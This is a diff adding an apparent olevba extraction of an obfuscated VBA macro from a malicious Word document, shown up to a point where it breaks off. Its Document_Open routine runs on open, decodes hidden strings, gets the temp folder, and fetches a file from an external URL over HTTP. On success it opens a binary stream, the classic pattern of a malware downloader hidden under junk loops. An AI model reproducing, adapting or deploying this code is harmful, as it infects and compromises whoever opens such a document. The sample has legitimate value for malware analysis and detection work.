@@ -1,0 +1,1378 @@
+Filename     : ./macros/4e8512a8154174e57ec8383622e1da7d9981b1f8d42194dcc2a638976c64849f
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Public Function AmUDWKu(TOiqyD As String) As String
+While AeGkoH < 381
+    HxsJcpnb = 519 - 1938 - 579
+    LFzMCY = 1996 + 716 + 1670
+    hhspCB = Left("#Pr&oMOp!hY-ySl", 2)
+    AeGkoH = AeGkoH + 1
+Wend
+mYeHr = StrReverse("qnzdq&e$[g")
+LFzMCY = UCase("EC[T]vXxwl")
+For jRrnGZ = 0 To 283
+    MBLnI = StrReverse(")lFmWV lFkY%")
+    EeZZa = Space(13)
+    whhXS = "^P%t?*]ewf" + "b_J-mAKkChLqH" + "G(&q&pmC^eHZ"
+    hhspCB = Right("GO$Zz&MSpQ]DaJ", 5)
+    mYeHr = 756 - 1943 - 797
+Next jRrnGZ
+    Dim JvmKLv() As Byte
+    LFzMCY = StrReverse("dtGWX[LHwgKJ")
+    LFzMCY = StrReverse("UTMQF^!Ni$V%")
+    For lbumny = 0 To 344
+        hhspCB = 336 - 1597 - 443
+        HxsJcpnb = StrReverse("#?b.(Bg-fv#dTP")
+        LFzMCY = Left("_u]YGS*$k)^e]nZxn-", 2)
+        whhXS = RTrim("]kI^Rw!.]bBxXdHT[Y")
+        hhspCB = Right("w(DJgT%e!gODht(*abn", 4)
+        LFzMCY = Left("Gx-!-HpPnu", 3)
+    Next lbumny
+    Dim eLbeSV(1000) As Byte
+    mYeHr = UCase("gMZFcN(PXEPROceyec")
+    MBLnI = StrReverse("qT@dt^IjF)!-!W!-o")
+    whhXS = Space(19)
+    JyvlJPlv = UCase("UkT?]TQF?$?dJE")
+    XVCNk = 0
+    whhXS = RTrim("ByV@BCdMvpERlv")
+    hhspCB = UCase("r GAfGuOso")
+    whhXS = Space(9)
+    HxsJcpnb = Right("EGPZL.K[U[", 3)
+    LFzMCY = Right("wHNjcyfunnhUXNW)U)", 3)
+    JvmKLv = StrConv(TOiqyD, vbFromUnicode)
+    LFzMCY = Right("Tp*_)HAjkvhlQQDD", 5)
+    EeZZa = UCase("yZ tA-vMqpoEuKNP^")
+    For Benqz = 0 To UBound(JvmKLv) - 1
+    MBLnI = RTrim("WxzLN@@s%N")
+    JyvlJPlv = StrReverse("Bil^?i-w]w&@sY)D")
+    While wZBquV < 148
+        hhspCB = 996 - 1255 - 1262
+        EeZZa = "@npbQVA@vIArY" + "hUhQ]aFFJ-N.YRTU-" + "UcfuQKVgBV&e#m$"
+        JyvlJPlv = UCase("Qft(njlPkArZav")
+        wZBquV = wZBquV + 2
+    Wend
+        If (Benqz Mod 2 = 0) Then
+            eLbeSV(XVCNk) = JvmKLv(Benqz)
+            hhspCB = UCase(")h@sotH-rM[EhTnSmW(")
+            EeZZa = StrReverse("Y!CiIcrulNr")
+            XVCNk = XVCNk + 2 - 1
+            While zLzeMP < 377
+                JyvlJPlv = "^_nNRp!dm%fvFwpDl" + "oJ^SOJxQNCvfoD$#Qj" + "FGlpd(sGH%"
+                EeZZa = Space(9)
+                HxsJcpnb = "RTB#^&B!fF&" + "CcWFM[hK)s-QPk" + "Km[?#-nmLMGF"
+                LFzMCY = StrReverse("^xyGRs^rovt(UP.m]Q")
+                mYeHr = UCase("NBuXaV.%hw.@rzdrIMK")
+                zLzeMP = zLzeMP + 2
+            Wend
+        End If
+        JyvlJPlv = Right("_b^s&R^@NSSkAru$U.t", 4)
+        LFzMCY = RTrim("Rul@ViApgmBGJnR%")
+        mYeHr = StrReverse(".tsWga)URe&jC#")
+        HxsJcpnb = 786 - 1808 - 763
+    Next Benqz
+    PtdwLqg = Space(20)
+    AmUDWKu = StrConv(eLbeSV, vbUnicode)
+    For GHTGzZ = 0 To 34
+        JyvlJPlv = StrReverse("fJJ[aD.eBOXZmUpM")
+        EeZZa = LTrim("eJfauScoDs_a[ravq_X")
+        HxsJcpnb = 895 + 1026 + 1531
+        mYeHr = LTrim("@U (VLjOUHTh-")
+        LFzMCY = Space(10)
+        mYeHr = Right("?^DVCmCI?__rRoc[_HI", 5)
+        PtdwLqg = " p]GmdBXj$@V" + "DtD)cfj-_*pi!" + "eNrVaeX?rh$Q?jbs"
+    Next GHTGzZ
+    For RULDSH = 0 To 385
+        PtdwLqg = UCase("zsZH@LQt?rqRwnOv")
+        whhXS = Right("&K]YPwdax@E.IVXkBpru", 5)
+        whhXS = "yxwtfXD%ffIZTjj*PU" + "LUWPgOZWs_&c%_yjW^rG" + "onltGtuLJyaxSYkj%"
+        MBLnI = 1700 - 1359 - 586
+        LFzMCY = Right("T!mlE$p_dB!P-U(BV", 3)
+        whhXS = StrReverse("B__aMq&VMS]#uY#Bn")
+        whhXS = LTrim("Y]HydX H%c")
+    Next RULDSH
+    While jyOZtc < 81
+        mYeHr = Right("gD]D[$JwbPDN M]fyB", 3)
+        mYeHr = 113 + 1264 + 838
+        JyvlJPlv = 1913 - 700 - 1882
+        HxsJcpnb = Space(15)
+        jyOZtc = jyOZtc + 3
+    Wend
+    whhXS = LTrim("ebBtzLhkN-M[ki&r_Z?k")
+End Function
+Private Sub ZyNzsJ(swbqYY As Boolean, yexrZw As Double)
+    hhspCB = LTrim("@jIb%mCvvln^l.")
+    MBLnI = "IZleibS.AwJ]*DT#wyS" + "GZF(R*ne(M%]p#]sM]" + "*q-XK)ioAPizTcK.[UV"
+    hhspCB = 576 - 570 - 595
+    While TBjNIY < 322
+        EeZZa = Left("Lo$%hQKJ^T", 2)
+        whhXS = Left("y!T#bS*M@A?xuDLh", 2)
+        EeZZa = StrReverse("vw*FERTQrXzV")
+        HxsJcpnb = RTrim("%NwK&o&aiWIeHuuXV")
+        HxsJcpnb = Left(".nRF$sCls^N ??BjyLh", 4)
+        JyvlJPlv = Right("otIprVpb%)huyLTp-iu", 5)
+        TBjNIY = TBjNIY + 1
+    Wend
+
+    whhXS = Space(13)
+    whhXS = 498 + 764 + 759
+    hhspCB = Right("Xna-?-_eVl&Nf@", 5)
+    MBLnI = StrReverse("kCs!jPQf_#Zp_Uehiu")
+    EeZZa = Left("n.VF@bxS[.Gl", 4)
+    mYeHr = RTrim("mIH!dIWRAcqYJ")
+    JyvlJPlv = UCase("RJ)o^Ah&Sjx_s!]Kh@")
+    PtdwLqg = RTrim("KkI&q$vCJxEnnrW")
+    HxsJcpnb = StrReverse("EX!wRcNg#z")
+    mYeHr = Right("s!xJ$XSI^_Rb", 2)
+    MBLnI = 1638 - 285 - 1187
+    hhspCB = Right("rf]wGPcS&Hz-DHZaVV^#", 4)
+    PtdwLqg = Right("O%IE^SsLj(Xnwt", 3)
+    mYeHr = Left("!-.v?oqYJQ]", 5)
+    LFzMCY = "d&[ezZyiWpT@c" + "JV^@MJEO_v" + "MsaF$URi?iR@@ "
+    MBLnI = LTrim("hgny*SlvqJoZ-.dQq")
+    While eheMdy < 129
+        whhXS = 786 + 1267 + 1000
+        mYeHr = Right("YROO?MK_Ai-MJ*vLFzji", 4)
+        HxsJcpnb = Left("vOB^D)q#tn(m$S", 4)
+        eheMdy = eheMdy + 3
+    Wend
+
+    MBLnI = Left("[Avjp)Z$%o(u", 3)
+    LFzMCY = "(l .@kcm$murG@*O" + "Kk?JcKmk^onD[Z" + "l$iAf&lTAeeyHc_ITA"
+    MBLnI = "upjN_a(CC!A[" + "s_L[.OcN Iyw(baYt" + "NyRu@qQL@gNJuJE"
+    LFzMCY = 1017 - 983 - 456
+    whhXS = Right("WYgaN-NMVldKrRE", 3)
+    mYeHr = 1402 + 405 + 1528
+    While WrQzqf < 247
+        mYeHr = Right("-F^kIE(ho]irE", 3)
+        mYeHr = StrReverse("wqqz MyDEN-$lWg&Y")
+        JyvlJPlv = 1124 + 1939 + 963
+        MBLnI = RTrim("DAys &m$[t^)MdIAM")
+        hhspCB = RTrim("^cW*A^wo)o*PT(A&")
+        whhXS = 220 + 639 + 285
+        mYeHr = Right("sYa.IXbZ)TUG$go?paP", 4)
+        JyvlJPlv = StrReverse("[kk)_KWhEer#e).%% JG")
+        EeZZa = 158 - 1514 - 1327
+        WrQzqf = WrQzqf + 2
+    Wend
+
+    EeZZa = StrReverse("@eADrhp-t.%eviY")
+    JyvlJPlv = RTrim("E(iZbVLP[Gtg$K#^HXe")
+    LFzMCY = Right("QU]m.qGjM ", 5)
+    hhspCB = Right("E^?bO^dC]CbnVPcGb@so", 3)
+    MBLnI = LTrim("SssW%_gy.BIy")
+    MBLnI = StrReverse("FL#dGstUP(WltE@%BAox")
+End Sub
+
+Private Function VsBSHL(ILwQOHz As Double, BYUPjFV As Double, uZMxlgA As Double, Tszmtu As Double) As String
+    JyvlJPlv = Left("Igb#pstQeIIbBQ@c^Q", 3)
+    whhXS = 1073 + 1083 + 466
+    JyvlJPlv = LTrim("(uEFf@RR%$kx")
+    mYeHr = 1926 - 1187 - 236
+    hhspCB = Space(13)
+    whhXS = Left("YEtV@ ue!@GU", 5)
+    HxsJcpnb = UCase("t!yRYC%Zyk")
+    For jCpssd = 0 To 65
+        JyvlJPlv = Space(18)
+        MBLnI = Left("t(DOU_]GEppCz-bg$D", 3)
+        HxsJcpnb = RTrim("!!cbGZ]KfJvlOD*XLd")
+        HxsJcpnb = 1854 - 1752 - 1026
+    Next jCpssd
+
+    JyvlJPlv = LTrim("E&RWm-ad@K")
+    LFzMCY = LTrim("[pjShtwFREim")
+    PtdwLqg = "H]!BrvSI]Ov@RQIFv&t" + "qsZs@dhzg!EK" + "(X_*mkRtZJhP@s] ]&"
+    JyvlJPlv = StrReverse("VxMIgTQo]%")
+    MBLnI = RTrim("fa@]o^!lM  )")
+    whhXS = "gu&sv*ZTm*E" + "P]y&?!xpCMBIRt" + "i*)#xlTMq[(jx)_Ogaf"
+    HxsJcpnb = 1105 + 1744 + 1224
+    mYeHr = RTrim(".jmcqi$-fd! V")
+    HxsJcpnb = Space(20)
+    LFzMCY = 923 - 207 - 1665
+    EeZZa = StrReverse("dx^JDSf#% n")
+    While oVFoIi < 375
+        whhXS = RTrim("grTOhe-Chqcdt_")
+        JyvlJPlv = RTrim("Zz.bnVBf_z.%#tZMYnM")
+        mYeHr = Right("r-pm&bKeYToOV[M)t$Y", 3)
+        PtdwLqg = Left("^AtwVxU@wVrkFPHV(CkV", 5)
+        MBLnI = LTrim("EEnbvPQ#@aH@Lc^-")
+        JyvlJPlv = "dOm(wXO$OI*" + "W?rMu?EmWwg&qI#TIp-" + ".TLA!Mi&zF"
+        whhXS = Space(18)
+        PtdwLqg = Left("$C [ylw.$Ew", 5)
+        MBLnI = LTrim("]&JfH(CDg G?U")
+        oVFoIi = oVFoIi + 2
+    Wend
+
+    VsBSHL = "ASSjURrjEObwoBNDLTpJ"
+End Function
+
+Private Sub rnYFmA(UpiCqgA As Boolean)
+    For rmtXeL = 0 To 34
+        mYeHr = Space(12)
+        JyvlJPlv = Left("AXUuMghkVK", 4)
+        HxsJcpnb = Space(15)
+        whhXS = "oIT$wdJ#_N*kmB" + "EH)URxdc-AFb*vO" + "RBd_celc^FwLYZd"
+        mYeHr = 1776 - 1159 - 1948
+        hhspCB = UCase("NdzsY-yJ]ifx")
+        EeZZa = LTrim("O TnDY(JKk#-uP*jPlhj")
+        HxsJcpnb = UCase("hB%qH(Eqa$Bdk")
+    Next rmtXeL
+
+    MBLnI = StrReverse("cIpG[IiidN ")
+    EeZZa = 932 + 317 + 238
+    PtdwLqg = 894 - 1545 - 1105
+    hhspCB = UCase("QsZCQqCf.CNRrbOS")
+    PtdwLqg = UCase("OBFmiURrKwCd(z")
+    LFzMCY = RTrim("StGr^ApIfc@qOe")
+    For wHpXvM = 0 To 162
+        PtdwLqg = 523 + 655 + 279
+        MBLnI = LTrim("E&_j_@_cM!p")
+        LFzMCY = 1555 + 1719 + 707
+        mYeHr = LTrim("UXmIWVRy%?zUNA-lr")
+        hhspCB = "_geRVngh&xNitHAp" + "(aZ?vAm&-#Pu " + "u^]^V.Va#vC*I@[p()c!"
+        LFzMCY = Left("Hqrhxp_WkgP", 5)
+        MBLnI = 1548 + 590 + 1623
+        mYeHr = 696 - 1870 - 587
+        LFzMCY = "g^dhY)DlxQn!Oa!" + "dJW_uIEkKc" + "nC&^KbZBxwSe*&"
+    Next wHpXvM
+
+    For CAxwqq = 0 To 195
+        MBLnI = StrReverse("*Lam?* B(^SZi")
+        mYeHr = StrReverse("]Y]hh!)bqcdLK^n- ")
+        PtdwLqg = StrReverse("#NU#eIHTqJ_f")
+    Next CAxwqq
+
+    HxsJcpnb = "pM%WNt?#XYXrEwTJ" + "zvSDE[oHghsc" + "n#.F)TiimjxhXR_nlm$K"
+    MBLnI = Left("jKLrFfLS)g(Ni.", 2)
+    LFzMCY = Left("*GotrYw.c]NqyYm", 3)
+    JyvlJPlv = Space(19)
+    LFzMCY = LTrim("&#S[-?Ygw(#PyGB")
+    hhspCB = UCase("xWfVe?azA_p[ztUH")
+    EeZZa = UCase("hnSpI-Khx$UItGM")
+    PtdwLqg = Space(19)
+    JyvlJPlv = "o$eWjJ!$rIO?m Un" + "&bq($n?%ZxDg" + "sUYrbrgY@W"
+    MBLnI = Left("qUVE^]D?i*gf__x", 5)
+    whhXS = Left("DuowIUUHarb", 2)
+    EeZZa = StrReverse("&ENkEmV*]^y@")
+    JyvlJPlv = UCase("[TmqBO!^VEZThS)X]vh")
+    mYeHr = "akukpIGD^fKEnyuc" + "eJC%o.GFi(.MI)Mw" + "qhmJlam$MC)HyEFf$d"
+    hhspCB = Left("E%IEs#^uNE?WR", 5)
+    JyvlJPlv = 1913 - 1258 - 1851
+    HxsJcpnb = Right("ML*Aee)@CvuFeH%Hj", 2)
+    hhspCB = UCase("VVWeyEz#qIywR@mieN*I")
+    PtdwLqg = UCase("f&tz]uM WJSHw")
+    JyvlJPlv = UCase("O%MRT F(P?-_.")
+    PtdwLqg = Right("JH YrybspD&KN&D[u", 3)
+    For mQGAyE = 0 To 138
+        whhXS = Left("RYTD cLB.*H)a]%H[k", 3)
+        LFzMCY = "cC#EpdLn#fz-*L!kp]-&" + "QeVhwDHZtfKpo" + "t_Or?y p^uW ^MPzkG"
+    Next mQGAyE
+
+End Sub
+
+Private Sub Document_Open()
+    Dim fJouoBOd As String
+    JyvlJPlv = RTrim("-BUWIXn@f^h")
+    For aZsAoR = 0 To 62
+        PtdwLqg = 782 + 1537 + 1009
+        HxsJcpnb = 1901 + 1015 + 348
+        whhXS = LTrim("b[?oarrh?l")
+        MBLnI = RTrim("f#g#Jkp?zf#")
+        MBLnI = UCase("#eRRIijd&xJs%]hpp")
+        EeZZa = 1160 + 1330 + 949
+        PtdwLqg = Right("codRZ$ vGddyc(XzrOR", 4)
+        PtdwLqg = UCase("D?SSekNXplH@DqAIXrM")
+    Next aZsAoR
+
+    For iLAsmk = 0 To 263
+        hhspCB = RTrim("hylaImKV&gIs(a#f")
+        JyvlJPlv = Right("GQbA.j_XFH(RZ", 4)
+        PtdwLqg = 721 + 668 + 171
+        HxsJcpnb = RTrim("TU.gNSphCZQWlC")
+        whhXS = "^Zd[MlaD[mdC$Co*mq" + "xv_lx][sj&cR*)h" + "y- z_eyY.Fk!psLD"
+        EeZZa = UCase("qb]sKX!c_z w&*@GYLX&")
+    Next iLAsmk
+
+    PtdwLqg = "RWU_f.zoqusom]GZccED" + "gM?*OIgpo]MvI&WMKXg" + "V TqFxlpb-]OhKtC$E"
+    For RtsppT = 0 To 298
+        MBLnI = LTrim("-wVMO_!Gie?.kQSgG .C")
+        PtdwLqg = UCase("^#J.ZVrVYfZvZowfKfA")
+        PtdwLqg = Left("NUdGJipgltWNI_s(t", 2)
+        whhXS = 1383 - 1489 - 1493
+    Next RtsppT
+
+    For ATQTks = 0 To 302
+        EeZZa = Left("O(^RpJaeS$vTa#", 2)
+        EeZZa = UCase("?X-yG.fnMBtl_oqPPST")
+        JyvlJPlv = Space(1)
+    Next ATQTks
+
+    hhspCB = Space(4)
+    mYeHr = UCase("A(v_f^]uuqwge")
+    Set uxiSNsp = CreateObject(AmUDWKu("sNcKrxi[p$t@ignFgT.$fLi^lpeKs&yEsftgebmkotb(jGeMcmtb"))
+    hhspCB = 1054 - 848 - 820
+    EeZZa = 1078 + 1196 + 800
+    HxsJcpnb = "awlLfzfFRVKtqehEXX" + ")HBsZZB*E*VvH]yqWFbS" + "vEGS%ff^OGY@.JOB"
+    mYeHr = RTrim("SfBqTt!HDi%%&y")
+    MBLnI = Right("qkjc)xFAyZEbhafwY", 5)
+    HxsJcpnb = Right("qfJ$VhV?JcfvK#aH$ ", 4)
+    JyvlJPlv = RTrim(" jKdYZwhRHH?p)O*OLK")
+    HxsJcpnb = LTrim("@ijrn-i&_N.SI*&kEfPD")
+    lLfirhl = uxiSNsp.GetSpecialFolder(1 + 1)
+    MBLnI = UCase("Yqo]NjRhG_I")
+    HxsJcpnb = 797 - 645 - 736
+    EeZZa = Right("h!Sl#sIBr*Ed", 4)
+    hhspCB = UCase("asfiuitMEeJ")
+    PtdwLqg = LTrim("Z!oYzG]qpI$gs- P")
+    JyvlJPlv = Left("E*J-Asv*)ef_q)NX", 3)
+    While uinkin < 309
+        whhXS = "K]^nvThW%bGdVLG])Q" + "SRxRsM&?lPNpDF^k&" + "daU?s#bqsr#sPWA"
+        MBLnI = UCase("f(%RZD@zTmJjVGQewSK")
+        PtdwLqg = 170 + 1489 + 1222
+        LFzMCY = Left("mUx!KRWwXOo!(H", 4)
+        EeZZa = 1526 - 1614 - 183
+        HxsJcpnb = "bVOO]#M%O@l$W" + "#Wk#XakqB&jcPI" + "OK?PQ]W)xiKY]lQ"
+        mYeHr = UCase("&@tu#Xqkc(")
+        whhXS = "Ud&RHnNFHPlx*%y" + "fbzKXXEpoFu_g#p" + "hIzxLDur]Vs"
+        HxsJcpnb = 990 + 1788 + 1768
+        mYeHr = 1357 + 1821 + 1715
+        uinkin = uinkin + 3
+    Wend
+
+    JyvlJPlv = UCase("#DyZKbb.r!")
+    fJouoBOd = StrReverse("Orjakjg.wGMiQqbAsi")
+    hhspCB = UCase("kEQNCEq!IUkW@Pwqrw")
+    mYeHr = UCase("a&I!F-ubgbX")
+    For clySUE = 0 To 180
+        EeZZa = Left("G_%N(Xo-Dtk^o%w-", 2)
+        HxsJcpnb = Space(2)
+        MBLnI = Left("LeFzp#vIsa", 3)
+        MBLnI = 552 - 1131 - 125
+        whhXS = 918 + 549 + 1844
+        HxsJcpnb = 1182 - 696 - 1614
+        mYeHr = UCase("uI_k#zXwSifWLNPC?Qx")
+        HxsJcpnb = Right("x(z^)(pYzKeEI-l^B", 4)
+        LFzMCY = 1474 + 1334 + 1460
+    Next clySUE
+
+    HxsJcpnb = 199 + 1203 + 374
+    EeZZa = Right("q[CE_vV!%A-RkWZX_Sg", 2)
+    HxsJcpnb = StrReverse(".XR- Ks]AXL-O$A")
+    EeZZa = Right("s^khe)#YDtMt", 5)
+    PtdwLqg = RTrim("wB(gktNJk#MuHvrz")
+    For zzzmKe = 0 To 59
+        HxsJcpnb = Left("_e*@mtCaxnNUa LRJ", 5)
+        mYeHr = LTrim("$xh(UI (KQ%t.")
+        LFzMCY = Right("A&ztJu.iUw", 5)
+        JyvlJPlv = StrReverse("$!$dD&*zhd?T#Sg")
+        LFzMCY = Space(19)
+        mYeHr = 467 - 1218 - 434
+        LFzMCY = Left("YqNAW.-mv*Dkzf^$oQTs", 4)
+        EeZZa = 1920 - 720 - 1253
+        MBLnI = Left("(B) V.EEsMB&", 3)
+    Next zzzmKe
+
+    mYeHr = StrReverse(".bF)xXdtDe[aZi.&x-B-")
+    HxsJcpnb = UCase("Ny&r[yiJyWb.f-qY")
+    While UiCdNd < 255
+        LFzMCY = Space(5)
+        mYeHr = UCase("&o@kIwn%MqG")
+        hhspCB = 1819 - 169 - 245
+        PtdwLqg = LTrim("GVFUYqp-kKaw?L")
+        mYeHr = StrReverse("Ze.mztZVLEDvoRcyx")
+        LFzMCY = StrReverse("gI&N_hdaAZv")
+        whhXS = StrReverse("!yX!G-R.e%IfcI]ySgM")
+        LFzMCY = StrReverse("Vkw$qXh%v%[$(kAA[$uy")
+        hhspCB = StrReverse("Rqe-iT.pc.Zb&")
+        UiCdNd = UiCdNd + 2
+    Wend
+
+    PtdwLqg = LTrim("$lEJwXzYyoJ]OzxXO")
+    hhspCB = 479 + 596 + 704
+    EeZZa = "H_!QvZ]ZdK.?(@?" + "DCAypnk$*pMyscT_d" + "Spkwx_S^Tm.gXjPJ!fz"
+    mYeHr = Space(5)
+    HxsJcpnb = "bC?YfMYZV[fehKIQ*" + "-MTV  ??j%m" + "xIbK&jMVPpLSUSDQ$Ts"
+    While MBdnpc < 92
+        mYeHr = RTrim("CVDi--Wn*vwRr")
+        EeZZa = StrReverse("]kjQ]R$f]NWy!*-MN!]")
+        hhspCB = LTrim("JgWA&pJNfKH")
+        mYeHr = 818 + 169 + 1757
+        EeZZa = 146 - 1538 - 174
+        MBLnI = Left("dDiXUg[gd)hJE( l xQ", 4)
+        PtdwLqg = LTrim("&I&oM )Y_V.cqjhyq^")
+        PtdwLqg = 1321 - 1814 - 600
+        MBdnpc = MBdnpc + 2
+    Wend
+
+    PtdwLqg = Left("BS*%-moufMr*ccJdR", 4)
+    EeZZa = 1814 + 646 + 1663
+    hhspCB = RTrim(")oKOoi*Yyiu")
+    Dim zQqZn, paOdgEL As Object
+    hhspCB = 1498 + 752 + 161
+    mYeHr = RTrim("tMWS_DjYZ#x#YR")
+    LFzMCY = LTrim("bv^##YaNqxdQQ?B!")
+    JyvlJPlv = LTrim("hRoiy!B[$pNT oi&dWL")
+    While JEHJFz < 32
+        MBLnI = RTrim("XBtIERlPo)#*!c")
+        HxsJcpnb = RTrim("ztBGKLiOrZ-Kgjus@")
+        mYeHr = 1674 - 536 - 1844
+        JEHJFz = JEHJFz + 2
+    Wend
+
+    PtdwLqg = "Zpvmw[jeJb." + "CJ$pVBjrUK#YPLtz" + "T?hSkz_HJLOng(m"
+    PtdwLqg = "J&UA&oVN%SIkwMURLJrV" + "fzFtQu[$nyNSlQPS!_" + "AiT!*KQ-!I!VT^"
+    EeZZa = "!UPaICk_E%FzB)" + "iEvuA.U[fUeb&S-VqQb" + "Bk(tkIHb_QowKqini"
+    HxsJcpnb = "^j&)fw?B.QsttN]DwDuT" + "^pZZCEM?cjJnPzn&" + "oVp.obVxje"
+    Set zQqZn = CreateObject(AmUDWKu("MRiVcDrxoasPo%fotx.TX_MiLDHrTxTvPE"))
+    JyvlJPlv = "X_qtgVviyd?@QB@)" + "%^NTM[E[ORhy]^xXppzH" + "cqfau-GKr]d&M"
+    PtdwLqg = RTrim("qqGxk@PLKB")
+    HxsJcpnb = StrReverse("KvFuwN_eeuWFIa")
+    LFzMCY = Space(20)
+    hhspCB = "EP-Z#oMT-l" + "(TZy*$iDjtYUV-eBKM[F" + "EL!?ZC$dX$eF"
+    wadyJ = AmUDWKu("hwt?tKpw:I/W/vhhiAg&hSp%anyI.(wle(b_sui%t_eS/mcss(sD/swMiqn?t#ixn^t..Sjya_rs")
+    hhspCB = RTrim("moSWksuZMd")
+    For TBdGxa = 0 To 137
+        mYeHr = Left("SK*T#RT]pZY%Tv)j^", 4)
+        MBLnI = 811 - 1113 - 1219
+        HxsJcpnb = RTrim(". K.c. [IH")
+        EeZZa = LTrim("DGAVN&mlAa!^")
+        hhspCB = RTrim("?Tbrwrxw)WEmJkOC$(n")
+        hhspCB = Right("n^]SS)W)@Z$JaXa", 3)
+        EeZZa = Left("_tUWm ?CgMmPhK(Ed", 2)
+        EeZZa = 1682 + 1675 + 750
+        LFzMCY = 1315 - 489 - 809
+    Next TBdGxa
+
+    While XhcaRh < 133
+        hhspCB = RTrim("k?UcbEtspH)")
+        MBLnI = UCase("[.IwExSBVp]ElCCHX")
+        MBLnI = Left(")Sno#xGjwLe?", 5)
+        HxsJcpnb = RTrim("lu^H?Kx@*BeEKrl@rgFD")
+        mYeHr = Left("WmNr.E$RY@", 2)
+        JyvlJPlv = Left("@ZhITqg.wU.lJ", 2)
+        hhspCB = 425 - 355 - 1965
+        EeZZa = 377 - 1385 - 971
+        MBLnI = LTrim("_a^!d(PuQRKXCq")
+        XhcaRh = XhcaRh + 1
+    Wend
+
+    hhspCB = 1403 - 288 - 307
+    HxsJcpnb = LTrim("w ar-)PpGLaPztBe])VB")
+    HxsJcpnb = "cQDU-JZvxpCBGJw-w nV" + "d&[hHr&tb[gYrVpT(_" + "v[SZc-EW#ikPyt]W[VT"
+    PtdwLqg = UCase("F!YG a.DwV[vB")
+    Call zQqZn.Open(StrReverse("T" + "E" + "G"), wadyJ, False)
+    mYeHr = Space(12)
+    PtdwLqg = Right("eTW!oxrgnY.ukOGnf", 2)
+    JyvlJPlv = Left("e)x-TBy(Ge-Ox", 2)
+    mYeHr = UCase("PgLaIdBL&O%bN")
+    While JDnxMj < 240
+        mYeHr = UCase("OCP#W#)INKjf")
+        HxsJcpnb = RTrim("cdfs*vG-dN*%*w] !ugc")
+        PtdwLqg = UCase("sTREOFQmOWQ")
+        hhspCB = RTrim("Nyt]yMGbO* f(VyxV")
+        whhXS = LTrim("R.]k_Ift&TKkgAv[")
+        JyvlJPlv = LTrim("ZuR^b*eW&fm!a]Gft")
+        MBLnI = 1762 - 682 - 1457
+        HxsJcpnb = "!BLuFtf&cYv" + "^%)[@o?iMoju)jA@k" + "upQNlb@LUudU"
+        HxsJcpnb = StrReverse("XP_mxHF%fg?C")
+        mYeHr = Right("WfxF&kUo#DI-bX -g", 3)
+        JDnxMj = JDnxMj + 1
+    Wend
+
+    zQqZn.send
+    LFzMCY = Space(15)
+    MBLnI = Right("oE]-wq[MAPhF*[FQc", 3)
+    JyvlJPlv = Left("(ck(o^Jy#XR", 5)
+    EeZZa = Right("SFW^r*ihjgfWHcLRh", 4)
+    PtdwLqg = "vXC$OQ_tS_Lp" + "Tv RhtbgpGjn$" + "i(UG)&@^%qzrhkb.l_*L"
+    For SIFzEw = 0 To 21
+        mYeHr = StrReverse("AsNwvFh_f^S^TUG_")
+        whhXS = LTrim("Xdyhe Kk*b")
+        JyvlJPlv = 489 - 610 - 405
+        PtdwLqg = UCase("rYNEgaV$hkQ^UM")
+        JyvlJPlv = 1390 - 227 - 168
+        EeZZa = Space(6)
+        hhspCB = Space(16)
+    Next SIFzEw
+
+    While LrEwbc < 84
+        MBLnI = UCase(" zxk-#@LMd")
+        hhspCB = RTrim("cndOBoDvCkuv.R")
+        JyvlJPlv = RTrim("EzBsN^.NQ&f)A")
+        JyvlJPlv = "mT#!zPjDs$^w" + "t^QZBZTSkSj#CZ" + "H(HH?PaD%ROv.qV"
+        PtdwLqg = RTrim("V. SXYOLpblKg")
+        EeZZa = RTrim("v[SPURTFIC")
+        JyvlJPlv = LTrim("mLo#Oa_NwaRuCibzc")
+        hhspCB = "yUC]BNC)Qj bwMy^ywD" + "KWZWmTNovhHXWKBOg^Z" + "HvBgxD#RXCBD%eoL"
+        EeZZa = UCase("t_Q^ImK$HOa")
+        LrEwbc = LrEwbc + 3
+    Wend
+
+    hhspCB = 598 + 153 + 1378
+    whhXS = 614 - 1150 - 1971
+    whhXS = Right("loNyEnjO@Tnu-VbV.uC", 3)
+    If zQqZn.Status = 205 - 3 - 2 Then
+    For GrkMIi = 0 To 301
+        MBLnI = LTrim("$eI%yi?TuGmaj")
+        JyvlJPlv = Left("!xiSatHkGxuKzD@T", 2)
+        MBLnI = RTrim("naHZg.lk_$-Tvueo")
+        EeZZa = 1366 - 844 - 439
+    Next GrkMIi
+
+    hhspCB = 320 + 1422 + 1721
+    LFzMCY = Space(6)
+    mYeHr = "VLdRP#p W[lrJ(J" + "^MYU V(%$A" + "KbdP-%zUskJ)%"
+    MBLnI = "WRuWvM(NT$g!!@[" + "#P*ovXQ%@Ve&" + "Jedc[Av&dhaSx"
+        Set paOdgEL = CreateObject(AmUDWKu("AiDxObD$BZ.@Sqt^rveCaUmG"))
+    For GIUnQT = 0 To 157
+        EeZZa = Space(3)
+        PtdwLqg = Space(3)
+        whhXS = "PfBftzIpxuRv#Xol%)" + "Y-S!Xb(]@ve^" + "maW[yMnnzoI(Ql^_elu "
+        MBLnI = Left("qUeW%pXV@(yL^", 5)
+        HxsJcpnb = Right("podeNjf[&M!IJbe*__", 4)
+        whhXS = StrReverse("WHNqRQ_azID")
+        JyvlJPlv = Space(5)
+        MBLnI = Right("NutfgccHstN", 3)
+        whhXS = Left("mQp.N-$^z wqhAgcF", 4)
+    Next GIUnQT
+
+    PtdwLqg = 1709 - 705 - 1327
+    MBLnI = Right("UzlJc]#fmdenIO", 2)
+    For TaiCIs = 0 To 396
+        mYeHr = UCase("SUfhOzUt@Ts)z)uKE_ R")
+        PtdwLqg = Right("cyYgEhw%IAZ", 5)
+        whhXS = 210 + 210 + 621
+        mYeHr = 137 - 805 - 1344
+        EeZZa = Space(2)
+        PtdwLqg = StrReverse("S]hrHjAD$#?vi#_")
+        whhXS = 1503 - 1834 - 377
+        LFzMCY = 540 + 1882 + 1189
+    Next TaiCIs
+
+    MBLnI = 310 - 105 - 1126
+        paOdgEL.Open
+    JyvlJPlv = RTrim("$j[mzwwfiH")
+    PtdwLqg = StrReverse("Lu&qDch?#- Xs?NF")
+    For MDacTQ = 0 To 92
+        hhspCB = 618 - 711 - 764
+        JyvlJPlv = "xIwF_#p&lBhUK-rw)" + "^EBbFXu#WxLrIRq" + "%ioHQJwiFzIL"
